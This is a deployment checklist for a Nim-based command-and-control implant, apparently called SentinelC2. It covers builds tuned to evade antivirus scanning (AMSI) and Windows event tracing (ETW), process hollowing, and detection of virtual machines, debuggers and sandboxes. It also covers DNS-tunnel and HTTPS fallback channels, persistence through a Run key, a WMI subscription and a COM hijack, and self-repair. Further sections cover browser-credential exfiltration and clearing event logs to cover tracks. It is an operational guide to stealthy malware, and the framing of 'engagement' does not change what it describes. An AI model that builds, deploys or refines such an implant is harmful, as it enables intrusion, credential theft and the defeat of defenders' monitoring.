# Hardened SentinelC2 Agent — Deployment Checklist

## Pre-Deployment

### Build Verification
- [x] Run `.\build_hardened.ps1` and confirm all 3 variants compile clean
- [x] Verify output binaries in `build/`:
  - [x] `agent_hardened_silent.exe` (~0.83 MB)
  - [x] `agent_hardened_engagement.exe` (~0.84 MB)
  - [x] `agent_hardened_aggressive.exe` (~0.84 MB)
- [x] Run PE import check: `python tests/pe_imports.py build\agent_hardened_aggressive.exe`
  - [x] Expected: `KERNEL32.dll` + `USER32.dll` + `msvcrt.dll` only (no `ntdll.dll`, `amsi.dll`, `winmm.dll`, `avicap32.dll`)
  - [x] Verified via `pefile`: all 3 variants show exactly 3 DLLs
- [x] Run E2E harness: `python tests/e2e_harness.py --start`
  - [x] Result: WS integration checks passed (set `C2_AGENT_PASSPHRASE`, `C2_WEB_USER`, and `C2_WEB_PASSWORD` first)

### OPSEC Pre-Flight
- [x] Verify XOR key was regenerated per binary (unique ciphertext in each)
  - `build_hardened.ps1` generates a fresh 32-byte key per variant via `New-XorKeyNim`
- [x] Run `strings agent_hardened_aggressive.exe | grep -i "amsi"` → expect 0 hits
  - Verified: `amsi.dll`, `AmsiScanBuffer` — **CLEAN** in all 3 binaries
- [x] Run `strings agent_hardened_aggressive.exe | grep -i "etw"` → expect 0 hits
  - Verified: `EtwEventWrite` — **CLEAN** in all 3 binaries
- [x] Run `python tests/scan_strings.py build\agent_hardened_aggressive.exe` and review the report
  - Verified: the previous engagement secret is **absent** from all 3 binaries
- [x] Verify WMI persistence strings are obfuscated
  - Verified: `__EventFilter`, `CommandLineEventConsumer`, `__FilterToConsumerBinding`, `Win32_LogonSession`, `__InstanceCreationEvent` — **ALL CLEAN** in all 3 binaries
  - Strings decrypted at runtime via `obfDec()` from compile-time `encodeObf()` consts
- [x] Verify agent secret is XOR-obfuscated (not plaintext in .rdata)
  - `S_AGENT_SECRET = encodeObf(SECRET_PLAINTEXT)` from generated `secret.nim`
  - Decrypted on first call via `agentSecret()` proc with lock + cache
- [x] Verify webhook URLs are obfuscated
  - `discord.com`, `hooks.slack.com` — **CLEAN** in all 3 binaries

### Signing
- [ ] Sign the binary with the clean signing certificate
- [ ] Verify signature: `Get-AuthenticodeSignature build\agent_hardened_aggressive.exe`

## Feature Verification on Test Host

### 1. Process Evasion & Shell Execution
- [ ] Deploy to a test VM with Defender ATP / CrowdStrike enabled
- [ ] Issue `shell whoami` via C2
- [ ] Verify command executes successfully
- [ ] Check Windows Event Log (Security) for Event 4688:
  - [ ] EXPECTED: No new process creation for cmd.exe
  - [ ] EXPECTED: Parent process is the hollowed target (svchost.exe / RuntimeBroker.exe)
- [ ] Verify output is captured and returned to C2

### 2. Syscall-Based File I/O
- [ ] Issue `download <path>` for a known file
- [ ] Verify file downloads correctly to C2 server
- [ ] Check if EDR telemetry shows CreateFile API calls:
  - [ ] EXPECTED: Fewer/minimal CreateFile telemetry events
  - [ ] EXPECTED: File operations occur via NtCreateFile path

### 3. Dynamic Evasion & Anti-Analysis
- [ ] Test in a VM (VirtualBox/VMware):
  - [ ] EXPECTED: Agent detects VM and bails out silently (no C2 contact)
- [ ] Test with a debugger attached (x64dbg):
  - [ ] EXPECTED: Agent detects debugger and bails out
- [ ] Test in Any.Run or similar sandbox:
  - [ ] EXPECTED: Agent detects timing anomaly (sleep acceleration) and bails
- [ ] Test on a physical machine:
  - [ ] EXPECTED: Agent registers normally with C2

### 4. C2 Resilience & Fallback Channels
- [ ] Configure DNS tunnel: set `DNS_TUNNEL_DOMAIN` and `DNS_TUNNEL_SERVER`
- [ ] Configure HTTPS fallback: set `HTTPS_FALLBACK_URL`
- [ ] Block the WSS port (8443) on the target
- [ ] Verify agent connects via DNS tunnel:
  - [ ] Check DNS server logs for TXT queries to `*.DNS_TUNNEL_DOMAIN`
  - [ ] Verify heartbeat reaches C2 via DNS
- [ ] Verify agent connects via HTTPS fallback:
  - [ ] Check CDN/proxy logs for GET requests with custom User-Agent
  - [ ] Verify heartbeat reaches C2 via HTTPS

### 5. Persistence Hardening
- [ ] Verify HKCU Run key is set: `reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- [ ] Verify WMI subscription exists (engagement/aggressive):
  - [ ] `Get-WmiObject -Namespace ROOT\subscription -Class __EventFilter`
  - [ ] `Get-WmiObject -Namespace ROOT\subscription -Class CommandLineEventConsumer`
- [ ] Verify COM hijack is registered:
  - [ ] `reg query HKCU\Software\Classes\CLSID\{...}`
- [ ] Verify ADS backup exists:
  - [ ] `dir /R %TEMP%\debug.log` (should show `:backup` stream)
- [ ] Test auto-repair:
  - [ ] Delete the implant copy
  - [ ] Remove the HKCU Run entry
  - [ ] EXPECTED: Agent restores itself within 10 minutes (persistence check cycle)

### 6. Data Exfiltration & Loot Collection
- [ ] Issue `exfil browser_creds`
- [ ] EXPECTED: Credentials arrive as structured JSON (not raw SQLite DB)
- [ ] Verify JSON contains: origin_url, username, password, browser, profile
- [ ] Check disk for staging directory:
  - [ ] EXPECTED: No `%TEMP%\svc\browser\` directory created
  - [ ] EXPECTED: Data was streamed directly to C2 (no staging)
- [ ] Issue `recon expanded`
- [ ] EXPECTED: Response includes installed_software, services, connections

### 7. Self-Destruct & Anti-Forensics
- [ ] Issue `panic <id>` to the agent
- [ ] EXPECTED: Agent sends confirmation then exits
- [ ] Verify meta file is shredded (not just deleted):
  - [ ] Check if `META_FILE` still exists → EXPECTED: No
- [ ] Verify staging directories are removed:
  - [ ] `dir %TEMP%\svc\` → EXPECTED: Not found
- [ ] Verify event logs are cleared:
  - [ ] `wevtutil qe Security /c:5` → EXPECTED: Fewer recent entries
  - [ ] `wevtutil qe Application /c:5` → EXPECTED: Fewer recent entries
- [ ] Verify implant copy is overwritten (not just deleted):
  - [ ] Check `%APPDATA%\Microsoft\.*\<legitname>.exe` → EXPECTED: Not found
- [ ] OPTIONAL: Take memory dump of agent before panic
  - [ ] EXPECTED: Key strings (secret, C2 URLs) are zeroed in memory

## Hardened Integration Items (7-point Audit)

### Item #1: AMSI/ETW Bypass at Process Start
- [x] `applyEvasionIfNeeded()` called as **first thing** in `agentLoop`, before `initLock`/`randomize`/any file I/O
- [x] Non-Windows stub added for portability
- [x] Binary scan: `amsi.dll` and `AmsiScanBuffer` absent from all 3 binaries

### Item #2: Sleep Obfuscation on All Sleep Sites
- [x] `sleepObfuscatedAsync(ms)` async wrapper around sync `sleepObfuscated()` from `anti_analysis.nim`
- [x] Slices sleep into 100ms chunks via `ntDelayExecution` direct syscall
- [x] QPC-based sandbox acceleration detection
- [x] Replaced all 3 `await sleepAsync` sites in `agentLoop` (initial jitter, beacon loop, post-disconnect reconnect delay)

### Item #3: Fallback C2 Channels Wired In
- [x] After 3+ WSS failures, agent tries `dnsTunnelPoll()` then `httpsFallbackBeacon()`
- [x] Full command dispatch via `handleCommand` with channel-aware `fbSend` closure
- [x] `FbCtx` ref object for GC-safety, accessed under `{.cast(gcsafe).}:` block
- [x] DNS responses dropped (no reply path), HTTPS responses sent via `httpsFallbackSend()`

### Item #4: Auto-Repair Loop on Every Boot
- [x] After `loadMeta()`, if `meta.copyPath` and `meta.regName` are set, calls `autoRepair(meta.copyPath, meta.regName)`
- [x] Checks if on-disk copy exists (restores from ADS then WMI backup if not)
- [x] Checks HKCU Run entry (re-establishes if scrubbed)

### Item #5: Real TLS Certificate Pinning
- [x] Ported full `ensurePinnedCertFile()` + `connectPinnedWebSocket()` from `agent.nim` to `agent_hardened.nim`
- [x] `import std/openssl` added to hardened variant
- [x] Real pinning: parse URI → raw TCP connect → SSL context with `CVerifyPeer` + `caFile=pinnedCertPath` → `wrapConnectedSocket` → manual WS upgrade → construct `WebSocket` object
- [x] Non-Windows stub falls back to `newWebSocket`

### Item #6: AES-256-GCM for Meta File
- [x] `deriveMetaKey()` uses PBKDF2-HMAC-SHA256(installKey, agentSecret, 100K iter) → 32-byte AES key
- [x] `metaEncrypt()` produces `[nonce:12B][tag:16B][ciphertext:NB]`
- [x] `metaDecrypt()` verifies GCM tag
- [x] On-disk format: `[installKey:32B][nonce:12B][tag:16B][ciphertext:NB]`
- [x] Verified on real meta file (174 bytes, proper nonce + tag structure)

### Item #7: Pure-Nim Stream Cipher for String Obfuscation
- [x] Replaced rolling-XOR with compile-time-callable stream cipher
- [x] `mixBytes()` (4x uint32 quarter-round, 8 rounds, keyed)
- [x] `streamCipher()` (CBC-style chaining over 16-byte blocks)
- [x] Per-string 4-byte nonce from compile-time counter `{.compileTime.}` var
- [x] On-binary format: `[nonce:4B][ciphertext:NB]`
- [x] `XorKey` expanded to 32 bytes, `build_hardened.ps1` generates 32-byte keys
- [x] Binary scan: all sensitive strings **CLEAN** in all 3 binaries

## Post-Deployment Monitoring

### C2 Server Logs
- [ ] Monitor `c2_server.log` for agent registrations
- [ ] Verify all agents report `variant: *-hardened`
- [ ] Check for fallback channel beacons (DNS/HTTPS)

### Telemetry Review
- [ ] Review EDR alerts for the first 24 hours
- [ ] Check for any "suspicious process creation" alerts
- [ ] Verify no "AMSI bypass" alerts were triggered
- [ ] Check for "ETW tampering" alerts

### Engagement Timeline
- [ ] Set killdate: `killdate <id> <unix_timestamp>`
- [ ] Verify agent stops at killdate: stops beaconing, sends final message
- [ ] OPTIONAL: Test dead-man's switch by blocking C2 for > DEAD_MAN_SECS
- [ ] EXPECTED: Agent self-destructs after dead-man period

## Rollback Procedure
- [ ] If agent is detected: issue `panic <id>` to all affected agents
- [ ] Verify all persistence mechanisms are removed
- [ ] Check for any remaining artifacts:
  - [ ] `reg query HKCU\Software\Classes\CLSID /s` (COM hijack)
  - [ ] `Get-WmiObject -Namespace ROOT\subscription -Class __EventFilter`
  - [ ] `dir /R %TEMP%\debug.log` (ADS backup)
- [ ] Clear event logs on compromised hosts (cover tracks)

## Known Limitations
- DNS tunneling is low-bandwidth (~250 bytes/query, ~200ms/query)
- HTTPS fallback requires CDN configuration (Cloudflare Workers / etc.)
- Process hollowing creates a suspended process — some EDRs flag this
- Clearing the Security log requires admin privileges
- COM hijack requires a target CLSID that's actually instantiated
- Auto-repair relies on ADS or WMI backup surviving host cleanup
- Nim proc names (`ntAllocateVirtualMemory`, `ntWriteVirtualMemory`) appear as lowercased mangled symbols in RTTI — not the Windows API name, won't trigger automated signatures but visible to manual analysis

## Red Flags (Stop Deployment If)
- [ ] Binary is flagged by Defender / CrowdStrike on a clean host
- [ ] PE import check shows unexpected DLLs (amsi.dll, ntdll.dll, winmm.dll, avicap32.dll)
- [ ] Strings scan reveals plaintext agent secret or WMI persistence strings
- [ ] EDR generates "process hollowing detected" alert within 1 hour
- [ ] DNS tunneling queries are blocked by network DNS firewall
